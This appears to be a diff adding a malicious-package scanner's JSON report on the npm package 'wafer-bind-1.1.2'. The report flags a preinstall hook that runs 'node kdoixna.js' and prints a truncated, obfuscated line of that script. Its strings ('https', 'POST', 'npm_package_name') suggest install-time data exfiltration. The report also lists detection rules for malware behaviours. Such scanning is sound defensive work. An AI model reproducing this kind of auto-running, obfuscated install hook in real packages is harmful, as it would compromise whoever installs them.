@@ -1,0 +1,28 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "npm-steganography": {},
+        "npm-exec-base64": {},
+        "npm-silent-process-execution": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "npm-serialize-environment": {},
+        "npm-install-script": [
+            {
+                "location": "package/package.json:7",
+                "code": "    \"preinstall\": \"node kdoixna.js\"\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            }
+        ],
+        "npm-obfuscation": [
+            {
+                "location": "package/kdoixna.js:1",
+                "code": "const a0_0xba0680=a0_0x2f39;function a0_0x1019(){const _0x4288ed=['10941100WGYugg','40wkSfBL','7qzuzkj','https','1034307UYOOQG','POST','npm_package_name','61526564csYJrx','from','stringify','41XYsLWn','4ghJyGd','join','write','81554ZgutpQ',...(0xec)]();",
+                "message": "This package is using a common obfuscation method often used by malware"
+            }
+        ],
+        "shady-links": {},
+        "npm-dll-hijacking": {}
+    },
+    "path": "./dataset/npm/wafer-bind-1.1.2"
+}
